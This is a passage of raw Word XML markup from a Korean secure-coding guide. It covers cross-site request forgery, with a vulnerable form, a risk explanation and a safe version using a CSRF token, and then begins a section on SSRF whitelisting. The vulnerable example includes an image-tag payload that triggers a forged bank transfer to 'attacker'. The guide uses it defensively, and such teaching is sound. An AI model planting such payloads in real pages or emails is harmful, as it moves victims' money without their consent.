                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> &lt;img src="https://site.com/transfer?to=attacker&amp;amount=100"&gt; </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>삽입</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자동</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>실행</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> --&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>&lt;form action="/transfer" method="post"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;input name="amount" value="100"/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>&lt;/form&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="002B1872">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="002B1872" w:rsidRDefault="00913677">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>위험</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="C00000"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> &lt;img src="https://bkr.kr/transfer?to=attacker&amp;amount=1000000"&gt; </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이메일이나</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>게시판에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>심어두면</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로그인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>상태인</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>피해자가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>해당</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>페이지를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>열람하는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>순간</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>피해자의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>세션</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>쿠키가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자동</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>첨부되어</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이체</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>요청이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전송됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>피해자는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>아무</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>행동을</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>하지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>않았음에도</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>금융</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>트랜잭션이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>&lt;!-- [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] CSRF </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>토큰</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> --&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>&lt;form action="/transfer" method="post"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;input type="hidden" name="_csrf" value="${csrfToken}"/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;input name="amount" value="100"/&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>&lt;/form&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">// </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서버에서</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>토큰</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> (Spring Security: @EnableWebSecurity </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>설정으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자동</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>처리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">  12. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>서버사이드</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>요청</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>위조</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>(SSRF)</w:t>
      </w:r>
      <w:r w:rsidR="00E4760E">
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="00E4760E">
        <w:rPr>
          <w:rFonts w:ascii="바탕체" w:eastAsia="바탕체" w:hAnsi="바탕체" w:cs="바탕체" w:hint="eastAsia"/>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>인젝션 서버 권한 탈취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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용자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입력값을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외부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서비스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호출</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> URL</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>로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사용할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경우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화이트리스트로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필터링한다</w:t>
            </w:r>
